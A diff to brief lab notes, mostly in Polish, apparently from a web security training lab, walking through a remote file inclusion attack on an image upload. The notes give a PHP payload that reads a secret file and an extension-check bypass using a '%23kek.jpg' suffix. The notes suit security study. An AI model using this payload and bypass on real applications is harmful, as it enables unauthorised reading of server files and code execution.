@@ -195,10 +195,13 @@ Admin Panel RFI
 RFI function on target allow the upload of image from remote HTTPS URL source and perform to validation checks, 
 the source URL must be HTTPS and the file extension is checked. Incorrect RFI result in response message, File must be either a jpg or png.
 
+RFI - bo target=aplikacja pobiera i wykonuje kod z remote, zdalnie z innego servera. to nie jest nic z lokalnym uploadem plikow.
+
 1. przygotowanie pliku na exploit server + store: /shell.php + body <?php echo file_get_contents('/home/carlos/secret'); ?> 
-2. upload pliku w przegladarce /shell.php i w burp przemieniam koncowke na shell.php%23kek.jpg 
-payload jest na serwerze, widze w logach ze bot wszedl na moj endpoint i jest 200 (/shell.php)
-3. wchodzę w repeaterze na endpoint gdzieladuja sie zdjecia by odczytac secret /blogImage/shell.php
+2. upload pliku w przegladarce /shell.php i w burp przemieniam koncowke na shell.php%23kek.jpg      # zakodowany na %23, ale niekoniecznie tak musi byc.
+3. SPRAWDZ na przykladzie prawilnego innego .jpg w jakim endpoincie zostaja zapisane pliki.
+payload jest na serwerze. !exploit server nie wykonuje kodu php. wykonanie nastapi gdy target (aplikacja) pobierze i przetworzy kod. widze w logach ze bot wszedl na moj endpoint i jest 200 (/shell.php)
+4. wchodzę w repeaterze na endpoint gdzieladuja sie zdjecia by odczytac secret /blogImage/shell.php
 
 
 
